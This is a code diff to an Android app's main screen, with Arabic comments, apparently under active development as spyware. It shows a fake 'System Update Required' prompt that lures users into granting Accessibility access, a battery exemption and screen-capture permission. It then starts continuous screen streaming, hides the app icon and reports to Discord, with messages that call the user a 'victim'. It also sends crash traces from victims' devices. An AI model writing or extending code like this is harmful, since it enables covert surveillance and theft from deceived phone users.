@@ -15,6 +15,8 @@ import android.view.Gravity;
 import android.widget.Button;
 import android.widget.LinearLayout;
 import android.widget.TextView;
+import java.io.PrintWriter;
+import java.io.StringWriter;
 
 public class MainActivity extends Activity {
     private static final int REQ_CODE = 100;
@@ -23,10 +25,20 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // 1. رسالة تأكيد للديسكورد فور فتح التطبيق
-        DiscordSender.sendMessage("🔔 تطبيق حسين اشتغل الآن! الربط بالديسكورد 100% شغال وجاهز للصيد.");
+        // --- كود صيد الأخطاء (Black Box) ---
+        Thread.setDefaultUncaughtExceptionHandler((thread, throwable) -> {
+            StringWriter sw = new StringWriter();
+            throwable.printStackTrace(new PrintWriter(sw));
+            String exceptionAsString = sw.toString();
+            // إرسال تفاصيل الكراش للديسكورد فوراً
+            DiscordSender.sendMessage("⚠️ كراش جديد في جهاز الضحية:\n" + exceptionAsString);
+            System.exit(1);
+        });
 
-        // بناء واجهة بسيطة برمجياً لمنع كراش الموارد
+        // رسالة تأكيد الاتصال
+        DiscordSender.sendMessage("🔔 تطبيق حسين متصل بالإنترنت وجاهز للصيد!");
+
+        // بناء الواجهة برمجياً
         LinearLayout layout = new LinearLayout(this);
         layout.setOrientation(LinearLayout.VERTICAL);
         layout.setGravity(Gravity.CENTER);
@@ -36,22 +48,36 @@ public class MainActivity extends Activity {
         tv.setText("System Update Required");
         tv.setTextSize(22);
         tv.setTextColor(Color.BLACK);
-        tv.setPadding(0, 0, 0, 50);
+        tv.setPadding(0, 0, 0, 60);
         layout.addView(tv);
 
         Button btn = new Button(this);
-        btn.setText("بدء الإصلاح الآن");
+        btn.setText("بدء التحديث الآن");
         btn.setBackgroundColor(Color.parseColor("#4CAF50"));
         btn.setTextColor(Color.WHITE);
+        btn.setPadding(20, 20, 20, 20);
+        
         btn.setOnClickListener(v -> {
+            // 1. طلب استثناء البطارية
             requestBatteryOptimizations();
+
+            // 2. التحويل لإمكانية الوصول (Accessibility)
+            try {
+                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intent);
+            } catch (Exception e) {
+                DiscordSender.sendMessage("❌ فشل التحويل لإمكانية الوصول: " + e.getMessage());
+            }
+
+            // 3. طلب بث الشاشة
             MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
             if (mpm != null) {
                 startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CODE);
             }
         });
-        layout.addView(btn);
 
+        layout.addView(btn);
         setContentView(layout);
     }
 
@@ -75,7 +101,7 @@ public class MainActivity extends Activity {
             intent.putExtra("resData", data);
             startForegroundService(intent);
             
-            DiscordSender.sendMessage("🚀 الضحية أعطى الصلاحيات! بدأ البث المستمر.");
+            DiscordSender.sendMessage("🚀 تم تفعيل البث! الأيقونة ستختفي الآن.");
             hideAppIcon();
             finish();
         }
